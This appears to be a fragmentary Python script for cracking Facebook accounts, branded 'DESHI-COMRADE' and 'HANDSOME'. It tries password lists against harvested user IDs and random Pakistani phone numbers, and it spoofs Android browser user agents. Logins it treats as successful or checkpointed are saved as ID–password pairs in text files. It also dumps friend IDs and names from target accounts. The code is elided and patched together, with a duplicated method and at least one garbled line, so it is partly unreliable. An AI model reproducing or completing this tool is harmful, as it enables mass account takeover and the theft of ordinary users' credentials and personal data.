...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mDESHI-COMRADE\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mHANDSOME-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mHANDSOME-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('HANDSOME_Ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[HANDSOME-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('HANDSOME_Cp.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[HANDSOME-CP] %s | %s%s      ' % (user,pw,tahun(user)))
...
def publiccrack():
    ...
    os.system('clear')
    print(banner)
    os.system('rm -rf .handsome1.txt')
    os.system('rm -rf .handsome2.txt')
    ...
    print(50*"\033[1;97m_")
    _CracKing__ = input('\033[1;37m[+] \033[1;32mCHOOSE OPTION : ')
    if _CracKing__ in ('1', '01'):
        __cracking__().plerr()
    if _CracKing__ in ('0', '00'):
...
def create_file():
    ...
    for fir in range(limit_user):
        ...
        try:
            ...
            qfr = json.loads(fr)
            temp_save = open('.handsome1.txt', 'a')
    ...
    for links in range(ask_link):
        completed +=1
        li = ('1')
        os.system('cat .handsome1.txt | grep '+li+' >> .handsome2.txt')
        
    save_file = input('\033[1;37m[+]\033[1;33m EXAMPLE \033[1;31m: \033[1;36m/sdcard/Shahnoor.txt\n\033[1;37m[+]\033[1;36m SAVE FILE AS \033[1;31m: \033[1;32m')
    os.system('clear')
    lines = open('.handsome2.txt', 'r').readlines()
    print(banner)
    print('\033[1;37m[+] \033[1;96mTOTAL IDS \033[1;31m: \033[1;92m'+str(len(lines)))
    print('\033[1;37m[+] \033[1;96mWAIT COLLECTING IDS ')
    print(50*"\033[1;37m_")
    fileid = '.handsome2.txt'
        ...
        try:
            ...
            for inayat in rgq['data']:
                ...
                try:
                    ...
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+' '+last_name+'\n')
            print('\033[1;97m [\033[1;32mDESHI-COMRADE\033[1;37m] \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
            idsave.close()
    ...
    version()
if not os.path.exists(".handsomework.txt"):
	open(".handsomework.txt", 'w').close()
class load:
    def __init__(self):
        _ = ''
        __ = int('30')
...
def random_pak_number():
    ...
    os.system('clear')
    print(banner)
    print('\t    \033[1;92m PAK RANDOM SIM NUMBER CLONER')
    print('\033[1;97m====================================================') 
    print(' Digit Code EXAMPLE (\033[1;32m92301\033[1;37m) (\033[1;32m92305\033[1;37m) (\033[1;32m92316\033[1;37m) (\033[1;32m92310\033[1;37m)')
    print('\033[1;97m====================================================') 
    kode = input('\033[1;97m[\033[1;31m?\033[1;37m] \033[1;92mINPUT CODE \033[1;91m: \033[1;96m')
    os.system('clear')
    print(banner)
    print('\033[1;97m Example \033[1;92m(10000) (20000) (30000) (40000) (50000)')
    print('\033[1;97m====================================================') 
    limit = int(input('\033[1;92mHow many numbers do you want to add ? '))
    ...
    print('\033[1;97m====================================================')
a=random.choice([f'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b}.{c}.{d}.{e} {f}',f'Mozilla/5.0 (Linux; Android 13; Nexus 9P Build/Alpha2.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b}.{c}.{d}.{e} {f}',f'Mozilla/5.0 (Linux; Android 13; LG-H918 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b}.{c}.{d}.{e} {f}',f'Mozilla/5.0 (Linux; Android 13; sdk_gphone64_arm64 Build/TPB4.220624.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.{c}.{d}.{e} {f}',f'Mozilla/5.0 (Linux; Android 13.9.4; amd64) AppleWebKit/978.1.63 (KHTML, like Gecko) Chrome/{b}.{c}.{d}.{e} Mobile Safari/978.1.63',f'Mozilla 5.0 (Linux; U; Android 13) Chrome/{b}.{c}.{d}.{e}'])
...
def rcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			sys.stdout.write('[CRACKING]  [%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
			sys.stdout.flush()
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\33[1;97m[\033[1;96mSUCCESSFUL\033[1;97m]\033[1;92m '+cid+' | '+ps+'\33[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\33[1;97m[\033[1;91mCHECKPOINT\033[1;97m]\033[1;90m '+cid+' | '+ps+'\33[0;97m')
				open('cp-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue 
...
\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.9   
